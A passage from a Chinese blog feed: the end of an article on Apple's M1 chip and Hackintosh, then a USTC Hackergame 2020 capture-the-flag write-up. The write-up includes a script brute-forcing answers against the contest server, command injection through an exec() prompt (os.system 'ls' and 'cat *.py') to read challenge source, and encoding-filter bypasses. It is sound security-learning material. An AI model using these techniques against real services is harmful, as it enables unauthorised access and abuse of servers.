呢？可以看出，苹果对比的显然是限制功耗和锁频后的性能，因此结论也就很明显了：ARM 凭借着高能耗比、低功耗，在轻薄本上大杀四方，吊打前款，但是绝对性能在普通 PC、笔记本上搭载的 Ice Lake 和 Tiger Lake 面前其实毫无优势、更不可能和 AMD 同台竞技。</p>\n<p>另外，M1 芯片为了追求超小体积和超低功耗，只在 SoC 中封装了两个 LPDDR4X 作为内存，因此只能提供最高 16G 的「DRAM」内存，这对上网本和办公白领来说绰绰有余，对「创作者」、「开发者」来说自然是远远不够的；被阉割的还有 Mac Mini 上的雷电接口，搭载 Intel 的 Mac Mini 有两个雷电控制器、而搭载 M1 的只有 SoC 里集成的一个，因此 ARM Mac Mini 只有两个雷电接口、而不是四个。</p>\n<p>综合来说，M1 的超低功耗、超高能耗比在轻薄本、上网本上绝对是不二选择，MBA 这样的目标用户更在乎发热和续航，而 M1 恰恰可以满足他们的需要；M1 所不能做的事情，如绝对性能不足、无法连接 eGPU、恰恰是上网本用户所不在意的。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/6.jpg\" alt=\"6\" width=\"1280\" height=\"718\" class=\"lazy post-img\"></p>\n<p>但是，苹果在没有电池的 Mac Mini、和在「面向创作者和开发者」的 MacBook Pro 13’ 上搭载孱弱的 M1，实在有点不可理喻、和一种自降身段的感觉。毕竟，Mac Mini 是时时刻刻需要插着电源的，而 MacBook Pro 13’ 的用户也不会抱着笔记本在户外使用 Xcode、Final Cut Pro X 和 Logic Pro，对吧？</p>\n<p>虽然我们现在看到 KOL、小编们普遍对 M1 称赞不已，但是可以预见当他们发现这次发布的三款 Mac 都没法安装 Windows、都暂时无法运行 Photoshop 后，对 ARM Mac 的评价也会逐渐转变风向的。</p>\n<h2>Apple ARM 芯片和 ARM Mac 的未来？</h2>\n<p>综合来说，我们在 M1 上看到了令人惊艳的超低功耗加超高能耗比；而在性能方面，对于一款 ARM 架构的处理器来说，「勉勉强强」能和 Tiger Lake「五五开」也已经是不小的成就了。在上网本、轻薄本级别的 MacBook Air 乃至日后可能重启的 MacBook 12’ Refresh 产品线上，M 系列处理器肯定是不二选择。</p>\n<p>与之对应的是「生产力 Mac」。MacBook Pro、iMac 的目标用户从事的工作大多为移动办公（MBP Only）、绘图、图像处理、音视频创作、影视制作、软件开发、轻度机器学习，而 Mac Pro、iMac Pro 的目标用户则大多从事大型影视剪辑、大型图像处理、大型数字音频制作、三维制作、大型机器学习等工作。而正如我在之前章节所说，让这类行业内的软件优化适配、使其能够发挥 ARM 的硬件的完整性能，还有非常漫长的一段路要走。而在这些行业中，自行组装 PC 固然可以弥补硬件性能上的差距、而在软件生态上 macOS 却是无出其右的，看看 Logic Pro、Final Cut Pro X 就知道了。苹果在未来很长一段时间内都会继续发布搭载 Intel 的 Mac。如果苹果一意孤行，急迫地在这类产品线强上 M 系列处理器，只会迫使这类目标用户转向 Windows 10 和 AMD 的怀抱。</p>\n<p>历史上，苹果的架构选择甚至还会受到苹果公司领导层决策的影响。1992 年苹果就在计划将 Macintosh System（Classic Mac OS）迁移到 X86 架构上，甚至开展了一项秘密计划「Star Trek」。而当更青睐 PowerPC 的苹果新任 CEO 走马上任以后，X86 架构迁移计划就被束之高阁，直到乔布斯重新回到苹果、WWDC 2005 宣布 Mac 将迁移到 Intel 处理器上。因此，也不排除存在这种可能：随着库克离任、苹果领导层变动、ARM 处理器不再向「高性能、密集计算」的方向突破，甚至可能苹果换了 CEO 后 Mac 将会搭载 AMD 处理器，但是这两种可能性显然不大。</p>\n<h2>黑苹果的未来？</h2>\n<p>作为一名黑苹果用户，M1 处理器的发布自然会引起对黑苹果未来的关注。正如我在「<a href=\"https://blog.skk.moe/post/history-osx86/#%E8%8B%B9%E6%9E%9C%E4%BB%80%E4%B9%88%E6%97%B6%E5%80%99%E4%BC%9A%E6%94%BE%E5%BC%83-Intel-%E7%9A%84-x86-%E6%9E%B6%E6%9E%84%EF%BC%9F\">黑苹果的未来</a>」一文中的「苹果什么时候会放弃 Intel 的 x86 架构？」章节中所说，过去 6 年之间每个 macOS 大版本都会兼容至少 7 年以前发布的设备。苹果的副总裁 John Ternus 在 Apple Events 中所说「This journey will take a couple of years to complete, and we have a long way to go」，预示着苹果在未来数年内都会继续发布搭载 Intel 处理器的 Mac。</p>\n<div class=\"license\"> <div class=\"license-title\">谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/talk-about-arm-m1-mac/\">https://blog.skk.moe/post/talk-about-arm-m1-mac/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-11-11</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/talk-about-arm-m1-mac/"},{"title":"USTC Hackergame 2020（中科大信安赛）write up","date":"2020-11-06 22:00:00","description":"\n<p>作为一只 CS 零基础、信安零基础、CTF 零基础的菜狐狐，苏卡卡今年又来参加 USTC Hackergame 啦！由于一边做题一边总结思路（指写 Write Up），所以苏卡卡应该是第一个发布非官方的 USTC Hackergame 2020 Write Up 的吧（嘿嘿）。</p>\n<blockquote><p>题图来自 USTC Hackergame 2019「Happy LUG」</p></blockquote>\n<span></span><h2>签到题</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/1.png\" width=\"508\" height=\"417\" class=\"lazy post-img\"></p>\n<p>只要提取 1 个 flag 就好啦！可是，为什么这个反人类的 <code>form-control</code> 的步长竟然是 0.00001：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/2.png\" width=\"794\" height=\"327\" class=\"lazy post-img\"></p>\n<p>继续看下去会发现，用手是根本不可能拖到 1.00000 的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.5/25.png\" width=\"636\" height=\"277\" class=\"lazy post-img\"></p>\n<p>不管了，直接点击「提取」：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/3.png\" width=\"482\" height=\"393\" class=\"lazy post-img\"></p>\n<p>同时，发现地址栏里的 URL 变成了 <code>http://202.38.93.111:10000/?number=0.84608</code>。那就立刻访问 <code>http://202.38.93.111:10000/?number=1</code> 拿到 flag！</p>\n<blockquote><p>Google 从 Chrome 76 起开始推行 WHATWG URL 规范中的「<a href=\"https://url.spec.whatwg.org/#url-rendering-simplification\">Simplify non-human-readable or irrelevant components</a>」、即「简化非人类可读或不相关的组件」。不过 Chrome 85 起提供了「Always Show Full URLs」的选项，可以在地址栏上右键后从菜单中开启。</p></blockquote>\n<h2>猫咪问答++</h2>\n<blockquote><ol>\n<li>以下编程语言、软件或组织对应标志是哺乳动物的有几个？<br>Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce.<br>提示：学术上一般认为龙不属于哺乳动物。</li>\n<li>第一个以信鸽为载体的 IP 网络标准的 RFC 文档中推荐使用的 MTU (Maximum Transmission Unit) 是多少毫克？<br>提示：咕咕咕，咕咕咕。</li>\n<li>USTC Linux 用户协会在 2019 年 9 月 21 日自由软件日活动中介绍的开源游戏的名称共有几个字母？<br>提示：活动记录会在哪里？</li>\n<li>中国科学技术大学西校区图书馆正前方（西南方向） 50 米 L 型灌木处共有几个连通的划线停车位？<br>提示：建议身临其境。</li>\n<li>中国科学技术大学第六届信息安全大赛所有人合计提交了多少次 flag？<br>提示：是一个非负整数。</li>\n</ol></blockquote>\n<p>其中，第二题、第三题、第五题的答案分别可以在下述 URL 中找到：</p>\n<ul>\n<li>\n<a href=\"https://tools.ietf.org/html/rfc1149\">RFC1149 - A Standard for the Transmission of IP Datagrams on Avian Carriers</a>：信鸽的典型 MTU 是 256 毫克</li>\n<li>\n<a href=\"https://news.ustclug.org/2019/09/2019-sfd-ustc/\">2019 软件自由日中国科大站 - USTC LUG</a>：开源游戏的名称是 Teeworlds、有 9 个字母</li>\n<li><a href=\"https://news.ustclug.org/2019/12/hackergame-2019/\">中国科学技术大学第六届信息安全大赛圆满结束 - USTC LUG</a></li>\n</ul>\n<p>至于第一题要搜索二十几种吉祥物、一不小心还会数错，第四题要去找卫星图像或者街景图，大尾巴狐狸太懒了、不想搜索了！有没有别的方法获取 flag？</p>\n<p>第一题给了 23 种编程语言、软件或组织：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-string\">\"Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce\"</span>.split(<span class=\"hljs-string\">'，'</span>).length<span class=\"hljs-comment\">// 23</span></code></pre>\n<p>至于图书馆前的地上停车位、总不可能超过 100 个吧？</p>\n<p>那么，写一个遍历跑第一题和第四题的答案，总会跑出 Flag 的！</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">1</span>; i &lt; <span class=\"hljs-number\">23</span>; i++) { <span class=\"hljs-comment\">// 至少有 1 种哺乳动物；既然提示了龙不是哺乳动物，那么肯定不会 23 种前部都是</span>  <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> j = <span class=\"hljs-number\">0</span>; j &lt; <span class=\"hljs-number\">100</span>; j++) { <span class=\"hljs-comment\">// 一个停车位都没有的可能性不是没有，遍历时要考虑进去</span>    <span class=\"hljs-keyword\">const</span> formData = <span class=\"hljs-keyword\">new</span> FormData();    formData.append(<span class=\"hljs-string\">'q1'</span>, i);    formData.append(<span class=\"hljs-string\">'q2'</span>, <span class=\"hljs-number\">256</span>);    formData.append(<span class=\"hljs-string\">'q3'</span>, <span class=\"hljs-number\">9</span>);    formData.append(<span class=\"hljs-string\">'q4'</span>, j);    formData.append(<span class=\"hljs-string\">'q4'</span>, <span class=\"hljs-number\">17098</span>);    fetch(<span class=\"hljs-string\">'http://202.38.93.111:10001/'</span>, {      <span class=\"hljs-attr\">body</span>: formData,      <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'POST'</span>,    }).then(<span class=\"hljs-function\"><span class=\"hljs-params\">resp</span> =&gt;</span> resp.text()).then(<span class=\"hljs-function\"><span class=\"hljs-params\">text</span> =&gt;</span> {      <span class=\"hljs-keyword\">if</span> (!text.includes(<span class=\"hljs-string\">'没有全部答对，不能给你 flag'</span>)) {        <span class=\"hljs-built_in\">console</span>.log(i, j, text);      }    });  }}</code></pre>\n<p>果然，<del>通过对比赛平台的 CC 攻击</del>，很快就把第一题和第四题答案跑出来了：第一题的答案是 12、第四题的答案是 9。输入正确答案提交即可获取 flag。</p>\n<h2>2048</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/4.png\" width=\"680\" height=\"888\" class=\"lazy post-img\"></p>\n<p>毫无疑问，这道题如果真的玩到 2048 获取 Flag 是肯定可行的，但是我懒；同样的原因，我也不想对这个网站里每个 JS 都审计一次。既然如此，不如先随便玩玩，看看这道题的 Flag 大概会藏在哪里。</p>\n<p>随便乱敲方向键刻意使 Game Over，DevTools 截获了一个 HTTP 请求、是 <code>html_actuator.js</code> 第 164 行发起的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/5.png\" width=\"1862\" height=\"712\" class=\"lazy post-img\"></p>\n<p>现在我们直接审计 <code>html_actuator.js</code> 就好了，把发起 AJAX 请求的函数找出来：</p>\n<pre><code class=\"hljs js\">HTMLActuator.prototype.message = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">won</span>) </span>{  <span class=\"hljs-keyword\">var</span> type    = won ? <span class=\"hljs-string\">\"game-won\"</span> : <span class=\"hljs-string\">\"game-over\"</span>;  <span class=\"hljs-keyword\">var</span> message = won ? <span class=\"hljs-string\">\"FLXG 大成功！\"</span> : <span class=\"hljs-string\">\"FLXG 永不放弃！\"</span>;  <span class=\"hljs-keyword\">var</span> url;  <span class=\"hljs-keyword\">if</span> (won) {    url = <span class=\"hljs-string\">\"/getflxg?my_favorite_fruit=\"</span> + (<span class=\"hljs-string\">'b'</span>+<span class=\"hljs-string\">'a'</span>+ +<span class=\"hljs-string\">'a'</span>+<span class=\"hljs-string\">'a'</span>).toLowerCase();  } <span class=\"hljs-keyword\">else</span> {    url = <span class=\"hljs-string\">\"/getflxg?my_favorite_fruit=\"</span>;  }  <span class=\"hljs-keyword\">let</span> request = <span class=\"hljs-keyword\">new</span> XMLHttpRequest();  request.open(<span class=\"hljs-string\">'GET'</span>, url);  request.responseType = <span class=\"hljs-string\">'text'</span>;  request.onload = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>) </span>{    <span class=\"hljs-built_in\">document</span>.getElementById(<span class=\"hljs-string\">\"game-message-extra\"</span>).innerHTML = request.response;  };  request.send();  <span class=\"hljs-built_in\">this</span>.messageContainer.classList.add(type);  <span class=\"hljs-built_in\">this</span>.messageContainer.getElementsByTagName(<span class=\"hljs-string\">\"p\"</span>)[<span class=\"hljs-number\">0</span>].textContent = message;  <span class=\"hljs-built_in\">this</span>.clearContainer(<span class=\"hljs-built_in\">this</span>.sharingContainer);  <span class=\"hljs-built_in\">this</span>.sharingContainer.appendChild(<span class=\"hljs-built_in\">this</span>.scoreTweetButton());};</code></pre>\n<p>看了代码就知道怎么获取 Flag 了，直接 GET <code>/getflxg?my_favorite_fruit=banana</code> 即可。</p>\n<blockquote><p>小彩蛋，在 JavaScript 中字符串类型 <code>String</code> 转换成数字类型 <code>Number</code> 时会得到 <code>NaN</code>，凑成了 <code>banana</code>。</p></blockquote>\n<h2>一闪而过的 Flag</h2>\n<blockquote>\n<p>…… <strong>程序每次运行时隐约可见黑色控制台上有 flag 一闪而过。</strong></p>\n<p>……</p>\n<p>而你作为一名新生，不由动了恻隐之心。望着诗人潇洒远去的背影，你可以赶在下午诗人回来之前，帮助这位可怜的人，用 flag 装满他的饭盒吗?</p>\n<p><a href=\"https://archive.org/details/untitled-01_exe\">打开/下载题目</a> （Hosted at Internet Archive）</p>\n</blockquote>\n<p>欺负苏卡卡用 macOS 不用 Windows，哼！苏卡卡才不会重启到 Windows 就为了看个 flag 呢，Parallels Desktop 启动！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/21.png\" width=\"1423\" height=\"781\" class=\"lazy post-img\"></p>\n<p>没有什么是截图解决不了的。。。啊，什么？还要区分 <code>i I 1 l</code>？<del>当然是猜 flag 啦</del></p>\n<p>小 Tip，打开 CMD、左上角图标右键、「默认值」，是可以设置「控制台窗口」默认字体和字号的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/22.png\" width=\"800\" height=\"440\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/23.png\" width=\"800\" height=\"440\" class=\"lazy post-img\"></p>\n<p>改了字体以后，这不就分得清清楚楚啦！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/24.png\" width=\"1067\" height=\"586\" class=\"lazy post-img\"></p>\n<h2>从零开始的记账工具人</h2>\n<blockquote>\n<p>如同往常一样，你的 npy 突然丢给你一个购物账单：“我今天买了几个小玩意，你能帮我算一下一共花了多少钱吗？”</p>\n<p>你心想：<del>又双叒叕要开始吃土了</del> 这不是很简单吗？电子表格里面一拖动就算出来了</p>\n<p>只不过拿到账单之后你才注意到，似乎是为了剁手时更加的安心，这次的账单上面的金额全使用了中文大写数字</p>\n<p><strong>注意：请将账单总金额保留小数点后两位，放在 <code>flag{}</code> 中提交，例如总金额为 123.45 元时，你需要提交 <code>flag{123.45}</code></strong></p>\n</blockquote>\n<p>这道题上来继续欺负苏卡卡没有在 macOS 上安装 Office，<del>大尾巴狐狸非常生气</del>。你看 npm 上这个能解析 <code>xlsx</code> 文件的 SheetJS、大写数字转小写的 nzh 还蛮好用的。Node.js 代码如下：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> XLSX = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'xlsx'</span>); <span class=\"hljs-comment\">// 解析 xlsx 用</span><span class=\"hljs-keyword\">const</span> NzhCN = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'nzh/cn'</span>); <span class=\"hljs-comment\">// 大写数字转小写</span><span class=\"hljs-keyword\">const</span> xlsx = XLSX.readFile(<span class=\"hljs-string\">'./bills.xlsx'</span>); <span class=\"hljs-comment\">// 当然你要先把 xlsx 文件下载下来</span><span class=\"hljs-keyword\">const</span> data = XLSX.utils.sheet_to_json(xlsx.Sheets[xlsx.SheetNames[<span class=\"hljs-number\">0</span>]]);<span class=\"hljs-keyword\">let</span> count = <span class=\"hljs-number\">0</span>;data.forEach(<span class=\"hljs-function\"><span class=\"hljs-params\">row</span> =&gt;</span> {  <span class=\"hljs-keyword\">const</span> moneyData = { <span class=\"hljs-attr\">yuan</span>: <span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">jiao</span>: <span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">fen</span>: <span class=\"hljs-number\">0</span> };  <span class=\"hljs-comment\">// nzh 不支持处理金额，需要自己实现一个</span>  <span class=\"hljs-keyword\">let</span> tmp;  [[<span class=\"hljs-string\">'元'</span>, <span class=\"hljs-string\">'yuan'</span>], [<span class=\"hljs-string\">'角'</span>, <span class=\"hljs-string\">'jiao'</span>], [<span class=\"hljs-string\">'分'</span>, <span class=\"hljs-string\">'fen'</span>]].forEach(<span class=\"hljs-function\">(<span class=\"hljs-params\">[i, dataKey]</span>) =&gt;</span> {    tmp = (tmp || row[<span class=\"hljs-string\">'单价'</span>]).split(i);    <span class=\"hljs-keyword\">if</span> (tmp.length === <span class=\"hljs-number\">1</span>) {      tmp = tmp[<span class=\"hljs-number\">0</span>]    } <span class=\"hljs-keyword\">else</span> {      moneyData[dataKey] = NzhCN.decodeB(tmp[<span class=\"hljs-number\">0</span>]);      tmp = tmp[<span class=\"hljs-number\">1</span>]    }  });  <span class=\"hljs-comment\">// 处理金额时，要小心浮点数大坑哟</span>  <span class=\"hljs-keyword\">const</span> value = moneyData.yuan * <span class=\"hljs-number\">100</span> + moneyData.jiao * <span class=\"hljs-number\">10</span> + moneyData.fen;  count = count + value * row[<span class=\"hljs-string\">'数量'</span>];});<span class=\"hljs-built_in\">console</span>.log(<span class=\"hljs-string\">`flag{<span class=\"hljs-subst\">${(count<span class=\"hljs-regexp\">/100).toFixed(2)}}`); /</span><span class=\"hljs-regexp\">/ 直接打印 flag</span></span></span></code></pre>\n<h2>超简单的世界模拟器</h2>\n<blockquote>\n<p>……</p>\n<p>你的任务是在生命游戏的世界中，复现出蝴蝶扇动翅膀，引起大洋彼岸风暴的效应。</p>\n<p>通过改变左上角 15x15 的区域，在游戏演化 200 代之后，如果被特殊标注的正方形内的细胞被“清除”，你将会得到对应的 flag：</p>\n<p>“清除”任意一个正方形，你将会得到第一个 flag。同时“清除”两个正方形，你将会得到第二个 flag。</p>\n</blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.5/26.png\" width=\"919\" height=\"936\" class=\"lazy post-img\"></p>\n<p>在 Google 上搜索「生命游戏」，找到了一个知乎提问和 <a href=\"https://www.conwaylife.com/wiki/Main_Page\">Conway Life Game Wiki</a>。大概了解康威生命游戏是什么后就理解了题目的要求：要在 15x15 的范围内构建一个生命游戏图形、在演化到 200 代之后会清除两个种群。</p>\n<p>第一个 Payload 是一艘最简单的会向右平移「飞船」（这个图形在知乎或是 Life Game Wiki 上都可以被轻易找到），可以直接摧毁第一个种群：</p>\n<pre><code class=\"hljs plaintext\">00000110111101101100011</code></pre>\n<p>第二个 Payload 是我一不小心试出来的，由一个平移的「飞船」和一个沿着斜对角线行走的「滑翔者」共同组成，他们会「擦弹」引发「大爆炸」，在 80 代左右摧毁第一个种群、在 160 代左右摧毁第二个种群：</p>\n<pre><code class=\"hljs plaintext\">0000011011110110110001100001101011</code></pre>\n<h2>从零开始的火星文生活</h2>\n<blockquote>\n<p>……</p>\n<p>L 同学打开附件一看，傻眼了，全都是意义不明的汉字。机智的 L 同学想到 Q 同学平时喜欢使用 <strong>GBK 编码</strong>，也许是打开方式不对。结果用 GBK 打开却看到了一堆夹杂着日语和数字的<strong>火星文</strong>……</p>\n<p>L 同学彻底懵逼了，几经周折，TA 找到了科大最负盛名的火星文专家 (你)。依靠多年的字符编码解码的经验，你可以破译 Q 同学发来的火星文是什么意思吗？</p>\n<p>注：正确的 flag 全部由 <strong>ASCII</strong> 字符组成！</p>\n</blockquote>\n<p>这种 GBK、UTF-8 之间的火星文编码问题，直接给一个 Unix 下的 <strong>万能解法</strong>：</p>\n<pre><code class=\"hljs bash\">cat gibberish_message.txt | iconv -f utf8 -t gbk | iconv -f utf8 -t latin1 | iconv -f gbk -t utf8</code></pre>\n<p>剩下要做的，就是把全角转换成半角了。</p>\n<h2>自复读的复读机</h2>\n<blockquote>\n<p>能够复读其他程序输出的程序只是普通的复读机。</p>\n<p>顶尖的复读机还应该能复读出自己的源代码。</p>\n<p>什么是国际复读机啊（战术后仰）</p>\n<p>你现在需要编写两个只有一行 Python 代码的顶尖复读机：</p>\n<ul>\n<li>其中一个要输出代码本身的逆序（即所有字符从后向前依次输出）</li>\n<li>另一个是输出代码本身的 sha256 哈希值，十六进制小写</li>\n</ul>\n<p>满足两个条件分别对应了两个 flag。</p>\n<p>快来开始你的复读吧~</p>\n</blockquote>\n<p>访问题目，输出的提示信息是：</p>\n<pre><code class=\"hljs plaintext\">Your one line python code to exec():</code></pre>\n<p>什么，可以 <code>exec()</code> 啊？那大尾巴狐狸直接干坏事了：</p>\n<pre><code class=\"hljs plaintext\">Your one line python code to exec(): import os; os.system(\"ls\")</code></pre>\n<p>发现目录下面有一个 <code>checker.py</code> 和一个 <code>runner.py</code>。接着用 <code>os.system(\"cat *.py\")</code> 获得题目源码：</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-comment\"># checker.py</span><span class=\"hljs-keyword\">import</span> subprocess<span class=\"hljs-keyword\">import</span> hashlib<span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">\"__main__\"</span>:    code = <span class=\"hljs-built_in\">input</span>(<span class=\"hljs-string\">\"Your one line python code to exec(): \"</span>)    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-keyword\">if</span> <span class=\"hljs-keyword\">not</span> code:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Code must not be empty\"</span>)        exit(-<span class=\"hljs-number\">1</span>)    p = subprocess.run(        [<span class=\"hljs-string\">\"su\"</span>, <span class=\"hljs-string\">\"nobody\"</span>, <span class=\"hljs-string\">\"-s\"</span>, <span class=\"hljs-string\">\"/bin/bash\"</span>, <span class=\"hljs-string\">\"-c\"</span>, <span class=\"hljs-string\">\"/usr/local/bin/python3 /runner.py\"</span>],        <span class=\"hljs-built_in\">input</span>=code.encode(),        stdout=subprocess.PIPE,    )    <span class=\"hljs-keyword\">if</span> p.returncode != <span class=\"hljs-number\">0</span>:        <span class=\"hljs-built_in\">print</span>()        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your code did not run successfully\"</span>)        exit(-<span class=\"hljs-number\">1</span>)    output = p.stdout.decode()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your code is:\"</span>)    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">repr</span>(code))    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Output of your code is:\"</span>)    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">repr</span>(output))    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Checking reversed(code) == output\"</span>)    <span class=\"hljs-keyword\">if</span> code[::-<span class=\"hljs-number\">1</span>] == output:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"/root/flag1\"</span>).read())    <span class=\"hljs-keyword\">else</span>:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Failed!\"</span>)    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Checking sha256(code) == output\"</span>)    <span class=\"hljs-keyword\">if</span> hashlib.sha256(code.encode()).hexdigest() == output:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"/root/flag2\"</span>).read())    <span class=\"hljs-keyword\">else</span>:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Failed!\"</span>)<span class=\"hljs-comment\"># runner.py</span><span class=\"hljs-built_in\">exec</span>(<span class=\"hljs-built_in\">input</span>())</code></pre>\n<blockquote><p>不要想着直接 <code>exec()</code> 偷 flag 了，你以为这比赛是 ylb 搞的啊？</p></blockquote>\n<p>可以看到「反向复读」的检查中使用了 <code>[::-1]</code> 倒序，所以在构造反向复读的语句中也应该使用 <code>[::-1]</code>。</p>\n<p>首先是构建正向复读的语句，在 Google 中 <del>盲目</del> 搜索的过程中确定了关键词「Quine Python」、找到了 <a href=\"https://www.geeksforgeeks.org/quine-in-python/\">这个网站</a>，介绍了如下语句：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">'_=%r;print (_%%_)'</span>;<span class=\"hljs-built_in\">print</span> (_%_)</code></pre>\n<p>那个网站也给出了这个语句的详细解释，不过简单来说，我们利用了 <code>print</code> 字符格式化、通过 <code>%r</code>（当然也可以用 <code>%s</code>）获得 <code>_</code> 变量的取值；而在 <code>_</code> 变量中使用了 <code>%%</code> 防止 <code>%</code> 被转义。</p>\n<p>既然有了正向复读，稍加改动即可得到反向复读。首先在 <code>print(_&amp;_)</code> 中加上 <code>[::-1]</code> 获得倒叙，同时也要对应修改 <code>_</code> 变量：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">')]1-::[_%%_(tnirp;%r=_'</span>;<span class=\"hljs-built_in\">print</span>(_%_[::-<span class=\"hljs-number\">1</span>])</code></pre>\n<p>信心满满地去提交，结果 Check Failed，发现 <code>print</code> 在结尾带上了换行符。所以再为 <code>print</code>再加上 <code>end=\"\"</code> 即可：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">')\"\"=dne,]1-::[_%%_(tnirp;%r=_'</span>;<span class=\"hljs-built_in\">print</span>(_%_[::-<span class=\"hljs-number\">1</span>],end=<span class=\"hljs-string\">\"\"</span>)</code></pre>\n<p>成功获得第一个 flag。</p>\n<h2>233 同学的字符串工具</h2>\n<blockquote>\n<p>233 同学最近刚刚学会了 Python 的字符串操作，于是写了两个小程序运行在自己的服务器上。这个工具提供两个功能：</p>\n<ul>\n<li>字符串大写工具</li>\n<li>UTF-7 到 UTF-8 转换工具</li>\n</ul>\n<p>除了点击下方的打开题目按钮使用网页终端，你也可以通过 <code>nc 202.38.93.111 10233</code> 命令连接到 233 同学的服务上。你可以在这里看到 233 同学的源代码: <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-string_tool-py\">string_tool.py</a>。</p>\n</blockquote>\n<p>这一道题我先拿到了第二个 flag 后才拿到了第一个 flag。首先在 <code>www.string-function.com</code> 这个网站上找到了 UTF-7 和 ASCII 编码互换表： <a href=\"http://string-functions.com/encodingtable.aspx?encoding=65000&amp;decoding=20127\">UTF-7 =&gt; ASCII</a> <a href=\"http://string-functions.com/encodingtable.aspx?encoding=20127&amp;decoding=65000\">ASCII =&gt; UTF-7</a>，照着表（加上一些简单的推算）将 <code>flag</code> 编码成 <code>+AGYAbABhAGc-</code>、成功拿到第二个 flag。</p>\n<p>获得第二个 flag 以后，决定根据相同的思路去查 Unicode sheet，但是直到后来经过提醒才想起来有「<a href=\"https://en.wikipedia.org/wiki/Orthographic_ligature\">合字</a>」这种神奇的存在，最终利用 <a href=\"https://www.compart.com/en/unicode/U+FB02#UNC_DB\"><code>U+FB02</code></a> 构造出 Payload 获得第一个 flag。</p>\n<h2>233 同学的 Docker</h2>\n<blockquote>\n<p>233 同学在软工课上学到了 Docker 这种方便的东西，于是给自己的字符串工具项目写了一个 Dockerfile。</p>\n<p>但是 233 同学突然发现它不小心把一个私密文件（<code>flag.txt</code>）打包进去了，于是写了一行命令删掉这个文件。</p>\n<p>「既然已经删掉了，应该不会被人找出来吧？」233 想道。</p>\n</blockquote>\n<p>首先让我们 <a href=\"https://hub.docker.com/layers/8b8d3c8324c7/stringtool/latest/images/sha256-aef87a00ad7a4e240e4b475ea265d3818c694034c26ec227d8d4f445f3d93152?context=explore\">看看这个 Docker Image 是怎么构建的</a>（不需要用 image 反推 Dockerfile 这种奇技淫巧，DockerHub 可以直接查看 Public 的 Docker Images 的构建过程），可以发现 233 同学首先把所有文件都添加到 Docker Image 中、再通过 <code>/bin/sh -c rm /code/flag.txt</code> 删除了 